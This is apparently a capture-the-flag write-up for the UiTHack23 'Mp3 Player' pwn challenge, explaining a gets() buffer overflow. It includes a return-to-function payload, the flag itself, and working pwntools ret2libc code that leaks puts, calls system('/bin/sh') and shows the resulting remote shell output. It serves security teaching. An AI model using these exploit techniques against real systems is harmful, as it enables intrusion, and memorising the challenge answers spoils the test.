> # Pwn - Mp3 Player
> > Pwn - 200pts
>
> We found an old mp3 player laying around and decided to connect it to the internet for everyone to listen to its > good ol' hits. <br />
> However, we might have messed up some of the instructions when setting it up...
>
> Files: [Source code](src)
>
> You can connect to the mp3 player with netcat
> ```bash
> $ nc motherload.td.org.uit.no 8006
> ```

## Writeup
Exploit script can be found in [exploit.py](exploit.py).

The C-code uses the `gets()` function to gather user input, which is vulnerable to a buffer overflow attack where we can overwrite the instruction pointer `rip` to call the function printing the flag.

We need to find the amount of bytes needed to overwrite the instruction pointer `rip`, and use that as padding before we overwrite `rip` with the function address of *call_me_maybe*, which gives us the flag.

The offset before overwriting the instruction pointer can be found with the python script [find_offset.py](find_offset.py) (requires pwntools `pip install pwntools`), or by manually segmentation faulting the program, and find the amount of bytes needed for the segmentation fault to occur.

The function address we want to overwrite the instruction pointer `rip` with can be found with pwntools' `elf.symbols["call_me_maybe"]` or with *gdb*
```bash
$ gdb mp3_player
$ disas call_me_maybe
Dump of assembler code for function call_me_maybe:
   0x00000000004012fb <+0>:	endbr64
   0x00000000004012ff <+4>:	push   %rbp
   0x0000000000401300 <+5>:	mov    %rsp,%rbp
```
Giving the address of the function 0x4012fb

The payload is then crafted by sending 40 bytes (our found offset) and the function address 0x4012fb as bytes.

```
UiTHack23{H3r35_MY_4dDr355_50_caLL_M3_may83}
```

## Alternative solution: Shell on the server

You can get a shell on the server running the mp3_player binary using the same technique as in the `tamagotchi` challenge.

The exploit-script for getting shell on the server is located in [exploit-shell.py](./exploit-shell.py), and the method used there is described more in-depth [here](../../tamagotchi/writeup/writeup.md).

In a short summary, we first find the libc version used by leaking the address of the puts-function from the got-table (global offset table), after we have found the offset to the `rip`-register
```python
offset = 40

# First ROP-chain to leak puts address in libc
rop = ROP(elf)
rop.raw(b"\x90"*offset)
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])

# Send payload
p.recvuntil(b"ABBA")
p.sendline(rop.chain())

# Parse the leaked address, and set libc base address
p.recvuntil(b"song\n")
puts_leak = u64(p.recvline().rstrip().ljust(8, b"\x00"))
log.info(f"Puts address found: {hex(puts_leak)}")
```

With the address of `puts` we can figure out the libc-version being used by the server (same libc as used in tamagotchi, and is the libc used by docker for 20.04 images).

Knowing the libc-version we can then call `system('/bin/sh')` to get shell on the server, with a second rop-chain (note that we in the first rop-chain redirected the program execution back to the *main* function so that we could send out second rop-chain).
```python
libc.address = puts_leak - libc.symbols["puts"]

# Second ROP-chain to get shell on the server
ret_addr = rop.find_gadget(["ret"])[0]
rop = ROP(libc)
rop.raw(b"\x90"*offset)
rop.raw(p64(ret_addr))
rop.system(next(libc.search(b"/bin/sh")))

# Send payload
p.recvuntil(b"ABBA")
p.sendline(rop.chain())
p.interactive()
```
By running the script with the correct libc-version of the server we get the shell, and have used an alternative (and harder) way to get the flag than the intended method described at first in this writeup.
```bash
$ python3 exploit.py
[+] Opening connection to motherload.td.org.uit.no on port 8006: Done
[*] Loaded 14 cached gadgets for './mp3_player'
[*] Puts address found: 0x7f53a2238420
[*] Loaded 196 cached gadgets for './libc.so'
[*] Switching to interactive mode

Could not play the requested song
$ ls
flag.txt
mp3_player
$ id
uid=1000(mp3) gid=1000(mp3) groups=1000(mp3)
```